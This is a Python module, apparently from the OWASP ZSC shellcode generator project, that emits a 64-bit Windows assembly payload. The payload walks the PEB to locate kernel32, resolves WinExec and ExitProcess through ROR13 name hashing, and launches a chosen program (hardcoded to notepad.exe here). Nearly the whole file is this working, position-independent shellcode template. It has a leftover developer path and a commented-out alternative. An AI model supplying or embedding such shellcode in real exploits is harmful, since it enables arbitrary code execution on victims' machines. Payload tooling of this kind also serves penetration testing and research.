#!/usr/bin/env python
'''
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
'''

from math import ceil
import sys
sys.path.insert(0, 'C:\\Users\\Nikhil\Desktop\\vagrant\\OWASP-ZSC')
from core import stack

def exc(file_to_exec):
	
    return '''
	bits 64
section .text
global start

start:
;get dll base addresses
	sub rsp, 20h                     ;reserve stack space for called functions
	and rsp, 0fffffffffffffff0h      ;make sure stack 16-byte aligned   
 	
	mov r12, [gs:60h]                ;peb
	mov r12, [r12 + 0x18]            ;Peb --> LDR
	mov r12, [r12 + 0x20]            ;Peb.Ldr.InMemoryOrderModuleList
	mov r12, [r12]                   ;2st entry
	mov r15, [r12 + 0x20]            ;ntdll.dll base address!
	mov r12, [r12]                   ;3nd entry
	mov r12, [r12 + 0x20]            ;kernel32.dll base address!
 
;find address of winexec from kernel32.dll which was found above. 
	mov rdx, 0xe8afe98				; hash of winexec given to rdx 
	mov rcx, r12					; rcx has dll address now
	mov r12, r12
	call GetProcessAddress         	; give arguments in rdx and rcx and get rax back with winexex
 	
; the winexec call
	jmp GetProgramName

ExecProgram:
	pop rcx 						;rcx has the handle to the calc.exe string (1st argument)
	mov edx, 1
	call rax
 				
;ExitProcess
	mov rdx, 0x2d3fcd70				
	mov rcx, r15
	call GetProcessAddress
	xor  rcx, rcx                  ;uExitCode
	call rax       

;get program name
GetProgramName:
	call ExecProgram
	db {0}
	db 0x00							; null terminated string

;Hashing section to resolve a function address	
GetProcessAddress:		
	mov r13, rcx                     ;base address of dll loaded - rdx has winexec, rcx has kernel32 addr
	mov eax, [r13d + 0x3c]           ;skip DOS header and go to PE header
	mov r14d, [r13d + eax + 0x88]    ;0x88 offset from the PE header is the export table. 
	add r14d, r13d                  ;make the export table an absolute base address and put it in r14d.

	mov r10d, [r14d + 0x18]         ;go into the export table and get the numberOfNames 
	mov ebx, [r14d + 0x20]          ;get the AddressOfNames offset. 
	add ebx, r13d                   ;AddressofNames base. 
	
find_function_loop:	
	jecxz find_function_finished   ; jump short if ecx is zero. nothing found 
	dec r10d                       ;dec ECX by one for the loop
	mov esi, [ebx + r10d * 4]      ;get a name to  from the export table. 
	add esi, r13d                  ;esi is now the current name to search on. 
	
find_hashes:
	xor edi, edi
	xor eax, eax
	cld

;this block computes the hash for whatever is at esi	
continue_hashing:	
	lodsb                         ;load byte at ds:esi to al
	test al, al                   ;is the end of string resarched?
	jz compute_hash_finished
	ror dword edi, 0xd            ;ROR13 for hash calculation!
	add edi, eax					; edi has the  hash from the hash calculation
	jmp continue_hashing

; this block checks the hash and then gives back the function loaded at eax	
compute_hash_finished:
	cmp edi, edx                  ;edx has the function hash (rdx , rcx was passed on from above)
	jnz find_function_loop        ;didn't match, keep trying!
	mov ebx, [r14d + 0x24]        ;put the address of the ordinal table and put it in ebx. 
	add ebx, r13d                 ;absolute address
	xor ecx, ecx                  ;ensure ecx is 0'd. 
	mov cx, [ebx + 2 * r10d]      ;ordinal = 2 bytes. Get the current ordinal and put it in cx. ECX was our counter for which # we were in. 
	mov ebx, [r14d + 0x1c]        ;extract the address table offset
	add ebx, r13d                 ;put absolute address in EBX.
	mov eax, [ebx + 4 * ecx]      ;relative address
	add eax, r13d					; eax has the required function given by the hash in rcx


find_function_finished:
	ret 

 '''.format(file_to_exec)

def run(data):
    # file_to_exec = data[0]
    file_to_exec = "notepad.exe"
    return exc(file_to_exec)

# 	#stack.generate gives us back the instructions with the file name encoded in it. 
# 	# choose register where you 
# 	return exc(stack.generate(file_to_exec, "%ecx", "string"), file_to_exec)
data = []
print(run(data))